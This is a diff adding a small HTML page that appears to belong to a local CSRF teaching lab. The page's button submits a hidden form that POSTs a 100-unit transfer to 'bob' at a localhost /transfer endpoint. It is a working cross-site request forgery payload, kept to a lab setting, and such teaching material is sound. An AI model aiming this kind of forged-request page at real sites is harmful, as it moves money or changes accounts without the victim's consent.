@@ -1,0 +1,27 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Example External Website</title>
+</head>
+<body>
+
+    <h1>Welcome to Example Website</h1>
+
+    <p>This is a separate website in your CSRF lab.</p>
+
+    <button onclick="document.getElementById('lab-form').submit()">
+        Test CSRF
+    </button>
+
+    <form
+        id="lab-form"
+        action="https://localhost:5000/transfer"
+        method="POST"
+    >
+        <input type="hidden" name="recipient" value="bob">
+        <input type="hidden" name="amount" value="100">
+    </form>
+
+</body>
+</html>
